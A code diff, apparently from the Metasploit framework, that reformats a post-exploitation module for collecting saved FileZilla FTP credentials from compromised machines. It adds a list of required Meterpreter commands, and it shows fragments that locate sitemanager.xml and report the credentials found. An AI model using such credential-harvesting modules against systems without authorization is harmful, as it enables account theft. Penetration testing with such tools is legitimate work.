@@ -9,19 +9,34 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather FileZilla FTP Client Credential Collection',
-      'Description'    => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather FileZilla FTP Client Credential Collection',
+        'Description' => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'bannedit', # post port, added support for shell sessions
           'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
         ],
-      'Platform'       => %w{ bsd linux osx unix win },
-      'SessionTypes'   => ['shell', 'meterpreter' ]
-    ))
+        'Platform' => %w{bsd linux osx unix win},
+        'SessionTypes' => ['shell', 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+              stdapi_fs_stat
+              stdapi_sys_config_getenv
+              stdapi_sys_config_getuid
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
@@ -38,6 +53,7 @@ class MetasploitModule < Msf::Post
       profiles = grab_user_profiles()
       profiles.each do |user|
         next if user['AppData'] == nil
+
         fzdir = check_filezilla(user['AppData'])
         paths << fzdir if fzdir
       end
@@ -84,11 +100,11 @@ class MetasploitModule < Msf::Post
 
       stat = session.shell_command("ls #{dir}/.filezilla/sitemanager.xml")
       next if stat =~ /No such file/i
+
       paths << "#{dir}/.filezilla"
     end
     return paths
   end
-
 
   def check_filezilla(filezilladir)
     print_status("Checking for Filezilla directory in: #{filezilladir}")
@@ -100,7 +116,6 @@ class MetasploitModule < Msf::Post
     end
     return nil
   end
-
 
   def report_cred(opts)
     service_data = {
@@ -129,9 +144,7 @@ class MetasploitModule < Msf::Post
     create_credential_login(login_data)
   end
 
-
   def get_filezilla_creds(paths)
-
     sitedata = ""
     recentdata = ""
     creds = []
@@ -193,7 +206,6 @@ class MetasploitModule < Msf::Post
         end
       end
     end
-
   end
 
   def parse_accounts(data)
